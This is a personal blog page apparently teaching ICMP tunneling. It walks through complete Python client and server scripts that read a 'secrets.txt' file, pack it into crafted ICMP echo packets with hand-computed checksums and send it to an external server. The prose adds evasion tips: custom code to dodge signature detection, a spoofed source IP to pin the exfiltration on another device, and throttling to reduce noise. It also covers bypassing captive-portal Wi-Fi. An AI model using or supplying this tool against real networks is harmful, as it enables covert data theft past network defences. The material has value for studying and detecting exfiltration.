<!DOCTYPE html>
<html>
<!--
   ##########################################
   #░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░#
   #░░░░░░░▄▄▀▀▀▀▀▀▀▀▀▀▄▄█▄░░░░▄░░░░█░░░░░░░#
   #░░░░░░█▀░░░░░░░░░░░░░▀▀█▄░░░▀░░░░░░░░░▄░#
   #░░░░▄▀░░░░░░░░░░░░░░░░░▀██░░░▄▀▀▀▄▄░░▀░░#   Checking out my code? I like you.
   #░░▄█▀▄█▀▀▀▀▄░░░░░░▄▀▀█▄░▀█▄░░█▄░░░▀█░░░░#
   #░▄█░▄▀░░▄▄▄░█░░░▄▀▄█▄░▀█░░█▄░░▀█░░░░█░░░#   Looking to hire me? You can reach
   #▄█░░█░░░▀▀▀░█░░▄█░▀▀▀░░█░░░█▄░░█░░░░█░░░#   me with my contact info. Tell me
   #██░░░▀▄░░░▄█▀░░░▀▄▄▄▄▄█▀░░░▀█░░█▄░░░█░░░#   you found this and I will be much
   #██░░░░░▀▀▀░░░░░░░░░░░░░░░░░░█░▄█░░░░█░░░#   more interested in working for your
   #██░░░░░░░░░░░░░░░░░░░░░█░░░░██▀░░░░█▄░░░#   company!
   #██░░░░░░░░░░░░░░░░░░░░░█░░░░█░░░░░░░▀▀█▄#
   #██░░░░░░░░░░░░░░░░░░░░█░░░░░█░░░░░░░▄▄██#
   #░██░░░░░░░░░░░░░░░░░░▄▀░░░░░█░░░░░░░▀▀█▄#
   #░▀█░░░░░░█░░░░░░░░░▄█▀░░░░░░█░░░░░░░▄▄██#
   #░▄██▄░░░░░▀▀▀▄▄▄▄▀▀░░░░░░░░░█░░░░░░░▀▀█▄#
   #░░▀▀▀▀░░░░░░░░░░░░░░░░░░░░░░█▄▄▄▄▄▄▄▄▄██#
   #░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░#
   ##########################################
-->
	  
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="An introduction to exfiltrating data with ICMP requests.">
    <title>ICMP Tunneling Basics</title>

    <!-- CSS and Fonts -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
	<link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="css/site-style.css" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
</head>

<body style="width:100%;height:100%;margin: 0px;padding:0px;overflow-x:hidden;">
    <!-- Navigation -->
    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
        <div class="container-fluid">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header page-scroll">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                    <span class="sr-only">Toggle navigation</span>
                    Menu <i class="fa fa-bars"></i>
                </button>
                <a class="navbar-brand" href="/">Nicholas Frichette</a>
            </div>

            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="/">Home</a>
                    </li>
		    <li>
                        <a href="bloghome">Blog</a>
                    </li>
                    <li>
                        <a href="about">About Me</a>
                    </li>
                    <li>
                        <a href="Resume.pdf">Resume</a>
                    </li>
                    <li>
                        <a href="https://github.com/Frichetten">Github</a>
                    </li>
		    <li>
                        <a href="projects">Projects</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Page Header -->
    <header class="intro-header" style="background-image: url('img/tunnel.jpg')">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="site-heading">
                        <h1>ICMP Tunneling Basics</h1>
                        <hr class="small">
                        <span class="subheading"></span>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <div class="container" style="margin-top:-50px">
        <div class="row">
		<div class="center-block" style="margin-left: 15px;margin-right: 15px;">
			<p>
			<b>NOTE: I tested this on a Linux (Ubuntu) system using Python 2.7.12, I'd suggest you do 
			the same. Conversions can be made very easily if you'd like to use another version of Python. If you use a 
			different OS you may get some errors with the socket creation, however that can be fixed with a quick Google 
			search (plug in the error number you get and go). In addition, I used a Digital Ocean Droplet as my server. If you 
			prefer another service (such as AWS), ensure that you can successfully ping that server as well as read the ICMP 
			traffic on the server side.</b><br><br>
			Ever been in a situation where your outbound network traffic has been blocked? For example at a hotel or coffee shop 
			wifi access point where they require you to log in to use the internet? These systems can be annoying or intrusive. 
			What if there was a way to side-step this process and tunnel out of the network? One such way to do this is through 
			<a style="text-decoration:underline" href="https://en.wikipedia.org/wiki/ICMP_tunnel">ICMP Tunneling</a>.<br><br> 
			The process of tunneling revolves around using a non-traditional protocol to carry your traffic outside of the network. 
			There are many different forms of tunneling including DNS and ICMP. Besides being a helpful tool, hackers can use 
			these techniques to quietly exfiltrate data, without a company's security team noticing. One survey found that as many 
			as 46% of the sample companies have experienced DNS exfiltration within the last year alone! (<a style="text-decoration:underline" href="http://www.securityweek.com/nearly-50-percent-organizations-hit-dns-attack-last-12-months-survey">source</a>).<br><br>
			ICMP Data Exfiltration is a nice technique because it makes use of the ICMP (Internet Control Message Protocol) network 
			protocol, which is typically used for troubleshooting on a network. As a result, not many 
			organizations can afford the cost of shutting off this important protocol. In addition, not many organizations 
			recognize how it can be abused, and as a result they do not block outbound ICMP traffic.<br><br>	
			<b>The goal of this article is to explain the basics of how ICMP tunneling works, develop code to perform 
			exfiltration, and demonstrate how simple and easy it is. This should only be used in a controlled environment, and 
			should be run on systems that you own or have permission to use.</b><br><br>
			It should be noted that there are many pre-built solutions you can use such a Loki, or 
			<a style="text-decoration:underline" href="https://github.com/DhavalKapil/icmptunnel">icmptunnel</a>. However 
			i'd like to show how this can be done from scratch with relatively little effort. In addition, writing your own 
			code should help prevent being noticed by signature based detection. Alright, let's begin!<br>
			<h3>ICMP 101: Ping, Request, and Reply</h3>
			If you have ever made use of ICMP before, it was likely through the "ping" tool on Windows or Linux. Ping allows you 
			to send some packets to a target (request) and recieve some packets back (reply). Typically when we ping a target, 
			we will send them some junk data, and they will send that junk data back. Instead, what we will do is send crafted data 
			that we plan to exfiltrate out of the network. I'd encourage you to open a terminal (or Command Prompt) and ping your 
			localhost.
			<h3>What does an ICMP packet look like?</h3>
			The first goal of any project is to know what you're trying to build. In this instance we are trying to impersonate 
			ICMP requests. The easiest way to know what these packets look like is to set up Wireshark to listen to your 
			network traffic, and then use the "ping" command to ping your machine (localhost). Below I have a screenshot of 
			what an ICMP packet looks like.
			<p style="text-align:center;"><img src="img/icmp-tunneling-basics/1.png" style="max-width:100%;border-width:1px;border-style:solid;border-color:black;"></p>
			There it is! A more astute reader may notice that there is no TCP or UDP header in the packet. This is because ICMP 
			uses a lower level protocol. As a result, this means that when we build our socket we will have to use something called 
			a "raw socket". The significance of this is that a raw socket requires root or administrative priviledges to use. 
			Keep this in mind when running this code. You will have to run this as root (or admin). Notice on the right side of the 
			bottom panel that we can see some of the junk data that the ping tool naturally generates. Now that we know what the 
			packet looks like, lets open up our text editor of choice (Vim) and get to work. For this article I have chosen to 
			write the tool in Python because Python is easy, clean, and more than efficient enough for our pruposes. It's my 
			go-to language for small projects that need to get done quickly. We will first build a socket with some parameters with 
			the following code.<br><br>
			<pre><code>import socket<br>import binascii as b<br><br>try:<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error, msg:<br>    print 'Error: ' + str(msg[0]) + 'Dont forget to sudo'<br>    exit()<br><br>packet = b.unhexlify('')<br><br>dest = '127.0.0.1'<br><br>print packet<br>sock.sendto(packet,(dest,0))<br><br>sock.close()</code></pre><br>
			Before continuting, lets take a moment to understand what this code is doing, first we import the socket and binascii 
			packages (more on this in a moment). Both of these packages should be shipped standard with any installation of Python. 
			Next we attempt to create a socket object called "sock" for us to interact with. Notice the try catch there? That is 
			because this program will need to be run with root priviledges. That try catch block will trigger if the socket 
			creation fails and will exit the application.<br><br>
			Next, we are creating the actual packet that we intend to send off. There are many different ways to craft a packet in 
			Python. Most developers would recommend the 
			<a style="text-decoration:underline" href="https://docs.python.org/2/library/struct.html">Struct</a> module. However 
			for the purposes of this article we are going to take a much more quick and dirty approach, literally dumping hex 
			strings into the packet. This is done using a helpful module called 
			<a style="text-decoration:underline" href="https://docs.python.org/2/library/binascii.html">"binascii"</a>.<br><br>
			What makes this module so useful is that using the "unhexlify" method, we can convert a hex string to binary and send that 
			across the network. The reason I like this method (aside from the fact that it's really cute) is that we can literally 
			copy and paste that hex value we got with Wireshark into our code and run it (The hex string is that middle block 
			of text in the picture above).<br><br>
			After you have pasted the hex string in the line: "packet = b.unhexlify('*PASTE HEX HERE*')", we then specify the 
			destination of our packet. For this field we are just using our localhost (127.0.0.1) for now. After that, we print 
			the contents of our packet to the console, and then send it. We send the packet using the "sendto" method from the 
			socket module. We specify the packet we would like to send, along with a tuple containing the destination IP address, as 
			well as the port. Due to the nature of how ICMP works, we don't need to specify a specific port, so 0 is fine. Finally 
			I close the socket at the end of the program.<br><br>
			Let's try this now. Open up Wireshark and listen to your local traffic. Then, run the code above as root and see what 
			you get. My output is pictured below.
			<p style="text-align:center;"><img src="img/icmp-tunneling-basics/2.png" style="max-width:100%;border-width:1px;border-style:solid;border-color:black;"></p>
			Ta-da! We have successfully sent a ICMP request with no effort at all (which is why I prefer the manual hex packet 
			crafting over Struct in this case). In addition, you can see that our localhost has replied to our request with 
			an ICMP reply packet.<br><br>
			Our next step will be to modify this packet so that we can use it how we want to. There are some things we need to be 
			aware of. It may be possible for this to work without changing any of the following depending on your setup. I 
			can't claim to be aware of how every system will react, or how it could be rigged to work this way. All I can say is that 
			by changing the following aspects of these packets I was able to communicate with an internet facing server under my 
			control (more on this in a bit). I would highly encourage you to research and change the following things so that the 
			system will work. The following is a list of things you will need to modify.<br><br>
			<ul>
				<li>Checksum</li>
				<li>Source Address</li>
				<li>Destination Address</li>
			</ul>
			<h3>Checksum</h3>
			This is likely the most difficult part of the entire program. I hope you remember bitwise operators and some conversion 
			tricks. If not, I have some code for you. Suffer where I have not (it wasn't that bad, I just made a technical 
			miscalculation).<br><br>
			The most key thing to understand when calculating the checksum is that you are not calculating a checksum for the 
			entire packet you are sending, just the actual ICMP part of the packet. In my case, this can be found by identifying the 
			"08" (which identifies an echo ping request) in the hex string. I would recommend using Wireshark to find this as it 
			is very useful for learning the layout of a packet.<br><br>
			I'm sure there are packages out there to help you do this (couldn't find any but I only looked for a second), however I 
			have some code below that does the work and suites our needs because we take in a hex string. (You may want to look at 
			this in landscape). Notice the variables "part1" and "part2"? Because I was reading the hex string from beginning 
			to end, the checksum will be represented in Host-Byte-Order. The problem is that because we are planning on 
			sending this information over a network, we want this to be in Network-Byte-Order. Those variables mentioned 
			swap the hex values around and give some padding to them. (Before you ask, yes the carry bit is included in 
			the calculation).<br><br>
			<pre><code>def checksum(line):<br>    hold = 0<br>    for i in range(0, len(line), 2):<br>        word = ord(line[i]) + (ord(line[i+1]) << 8)<br>        carry = hold + word<br>        hold = (carry & 0xffff) + (carry >> 16)<br>    toReturn = bin(~hold & 0xffff)[2:].zfill(16)<br>    part1 = hex(int(toReturn[:8],2))[2:].zfill(2)<br>    part2 = hex(int(toReturn[8:],2))[2:].zfill(2)<br>    return part2+part1</code></pre><br>
			As for what part of the hex string we send to the checksum function, lets look at an example. I have provided some 
			comments to help distinguish some parts of the string. (You may want to look at this in landscape).<br><br>
			<pre><code>packed = b.unhexlify("0800000055d70001" + data)<br>checkSum = checksum(packed)#        This is local IP--V            V--This is server IP<br>packet = b.unhexlify("450000548d9440004001af12" + "0a8773f8" + "8ac54bc5" + "0800" + checkSum + "55d70001" + data)<br>                                   This is where the checksum string starts--^                       ^--packet identifier</code></pre><br>
			Now for the explanation of the checksum string. This is identified by the "packed" variable. As mentioned earlier 
			the first two characters, "08" is the echo ping request. Following that is "00" which is the "code" part of the packet. 
			Following that is four 0's, "0000". This is the checksum itself (Yes, you need to calculate the checksum using a 
			placeholder checksum). This placeholder is just "0000". Then we have "55d70001". This is just an identifier and a 
			sequence number. The final part of the hex string is the actual data that we want to send to our server outside the 
			network. This should be in hex format before it is run through our checksum function.<br><br>
			After that, you have to actually build the packet. I've added some annotations through comments so that 
			you can see how the packet is built. It would likly be best for you to plug in your own values from your Wireshark 
			testing.<br><br>
			<h3>Source Address</h3>
			Depending on your setup you can change the "source address" field of the packet. I've tested this and it works on my 
			home network, while still delivering the packets to my controlled server. Why would you do this? In theory you could 
			spoof an IP, or attempt to pin the exfiltration on another device on the network (although I don't know how well this 
			could fool someone. I was getting a ton of arp requests when I claimed to be a device that doesn't exist. When I 
			claimed to be an existing device, I assume the router sent the traffic to that device, I didn't test that.). Because you 
			are just testing this for fun and education, put your actual IP (not your internet 
			facing IP, use your device's actual network IP. It probably starts with 192 or 10).<br><br>
			<h3>Server: Digital Ocean</h3>
			<p style="text-align:center;"><img src="img/icmp-tunneling-basics/do.jpg" style="max-width:50%;border-width:1px;border-style:solid;border-color:black;"></p>
			I am completely aware that this tutorial could have been done entirely on my home network (it also could have been about 
			one tenth as long, but I wanted to be as thorough as possible). However, I wanted to show what this would look like in a 
			real world scenario, as well as prove that it works. To accomplish this goal, I have a Digital Ocean Droplet set up on 
			a fixed IP address. If you're not familiar with Digital Ocean, its an IaaS provider, similar to AWS. I like it because 
			it's cheap ($0.007/hour I'm not joking) and it's easy to get up and running (click a button and go). This setup I have 
			for testing is a Ubuntu 16.04, 64-bit system. It is internet facing and I can connect to it over the internet.<br><br>
			First, lets test to make sure that our server can recieve ICMP packets over the internet. To do this, we need some code 
			to listen for ICMP. This code is below.<br><br>
			<pre><code>import socket<br>import binascii as b<br>import sys<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br>s.bind(('*IP.ADDRESS*',0))<br><br>a = ''<br>while 1:<br>    data, addr = s.recvfrom(1024)<br>    print data</code></pre><br>
			The only tweak you need to make is to put the correct IP in the bind function. This needs to be the same as the IP of 
			your server. Now, run this code on your server, you will see a blank prompt. Next, go to your favorite terminal of 
			choice and ping the IP address of your server. You should see something similar to the following picture.
			<p style="text-align:center;"><img src="img/icmp-tunneling-basics/3.png" style="max-width:100%;border-width:1px;border-style:solid;border-color:black;"></p>	
			Notce that sequence of numbers at the end of each line? That's the same sequence of numbers in the junk data 
			coming from our ping packets! Great, we now know that we are able to communicate with the server. Now that we 
			have our reciever up and running, lets build our client.
			<h3>Client</h3>
			We are almost at the end folks.	Our next job will be creating the actual client that will send data up to our server. 
			Code for this can be seen below. <b>Be aware: A lot of this can be tweaked however you like. I am setting the length 
			of data to send to be 16 characters. There is nothing stopping you from changing this.</b><br><br>
			<pre><code>f = open('secrets.txt', 'r')
lines = "".join(f.readlines())

for cut in [lines[x:x+16] for x in range(0, len(lines), 16)]:
    data = cut
    if len(data) < 16:
        data = data + ("}"*(16-len(data)))

    stuff = [hex(ord(x))[2:].zfill(2) for x in data]
    data = "".join(stuff)

    packed = b.unhexlify("0800000055d70001" + data)
    checkSum = checksum(packed)#        This is local IP--V            V--This is server IP
    packet = b.unhexlify("450000548d9440004001af12" + "c0a80102" + "8ac54bc5" + "0800" + checkSum + "55d70001" + data)
    dest = '*SERVER IP*'
    print checkSum
    sock.sendto(packet,(dest,0))
    time.sleep(2)
</pre></code><br>
			Now for an explanation. First, we are opening a file we have called "secrets.txt", this is the file we are trying 
			to transmit across the internet using ICMP. After that, we use a list comprehension to grab 16 characters of data and 
			convert that to hex before saving it in a veriable called "data". You may notice that I choose to append a bunch of 
			"}" characters to a line if it is less than 16. I am putting this here as a sort of EOF. There are plenty of more 
			elegant ways of achieving this, I chose a simple one due to the scope of this article. After this we send our data 
			to our server. Keep in mind that ICMP is not a stateful protocol, thus you can send packets out of order. There are 
			solutions to this (such as giving each packet a unique sequential number, or checking the timestamp on each packet) 
			however, for the purposes of this tutorial, I have simplified this such that we will take a small pause after each 
			packet sent (that's the "time.sleep(2)"). In addition, it may be a good idea to limit the amount of traffic you are 
			sending anyways to reduce your "noise".<br><br>
			<h3>Putting it all Together</h3>
			We now have everything in place. Let's start tunneling some data. A minor change to our server code, we don't want 
			to print to a new line every time we recieve something, and we don't want to print out the full packet, just the 
			data we've placed at the end. To compensate for this, I've sliced off the beginning 26 characters (this stays the same 
			no matter what), as well as changed the "print" statements to use "sys.stdout.write()".<br>
			<h3>ICMPServer.py</h3>
			<pre><code>import socket
import binascii as b
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
s.bind(('*IP.ADDRESS*',0))

a = ''
while 1:
    data, addr = s.recvfrom(1024)
    sys.stdout.write(data[26:])
    sys.stdout.flush()</code></pre>
			<h3>ICMPClient.py</h3>
			<pre><code>import socket
import binascii as b
import time

def checksum(line):
   hold = 0
   for i in range(0, len(line), 2):
       word = ord(line[i]) + (ord(line[i+1]) << 8)
       carry = hold + word
       hold = (carry & 0xffff) + (carry >> 16)
   toReturn = bin(~hold & 0xffff)[2:].zfill(16)
   part1 = hex(int(toReturn[:8],2))[2:].zfill(2)
   part2 = hex(int(toReturn[8:],2))[2:].zfill(2)
   return part2+part1

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except socket.error, msg:
    print 'Error: ' + str(msg[0]) + 'Dont forget to sudo'
    exit()

f = open('secrets.txt', 'r')
lines = "".join(f.readlines())

for cut in [lines[x:x+16] for x in range(0, len(lines), 16)]:
    data = cut
    if len(data) < 16:
        data = data + ("}"*(16-len(data)))

    stuff = [hex(ord(x))[2:].zfill(2) for x in data]
    data = "".join(stuff)

    packed = b.unhexlify("0800000055d70001" + data)
    checkSum = checksum(packed)#        This is local IP--V            V--This is server IP
    packet = b.unhexlify("450000548d9440004001af12" + "c0a80102" + "8ac54bc5" + "0800" + checkSum + "55d70001" + data)
    dest = '*SERVER IP*'
    print checkSum
    sock.sendto(packet,(dest,0))
    time.sleep(1)

sock.close()</code></pre><br>
			With all the code out of the way, it's now time to see the fruits of our labor. Below you can see our tunneling in 
			action from the server-side perspective.<br>
			<p style="text-align:center;"><img src="img/icmp-tunneling-basics/view.gif" style="max-width:100%;border-width:1px;border-style:solid;border-color:black;"></p>	
			And that's all it took. We are now transmitting information using only the ICMP network protocol. There are a number 
			of ways this can be optimized or improved. We could change how frequently we send data, encrypt that 
			data, change our source IP, etc (however that goes beyond the scope of this article).<br><br>
			Got any comments, questions, or concerns? I'd be happy to hear about it! Reach me with the contact 
			information on the home page of this site.			
		</div>					
        </div>
    </div>

    <!-- Contact Info -->
    <footer>
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <ul class="list-inline text-center">
                        <li>
                            <a href="https://github.com/Frichetten">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
			<li>
                            <a href="https://www.linkedin.com/in/nick-frichette-633297126">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </footer>

	<!-- JavaScript -->
	<!-- jQuery -->
    <script src="vendor/jquery/jquery.min.js"></script>
	
    <!-- Bootstrap Core JavaScript -->
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>

    <!-- Contact Form JavaScript -->
    <script src="js/jqBootstrapValidation.js"></script>
    <script src="js/contact_me.js"></script>

    <!-- Theme JavaScript -->
    <script src="js/clean-blog.min.js"></script>
	
	<!-- Fun Stuff -->
	<script type="text/javascript" src="js/fun.js"></script>

</body>
</html>
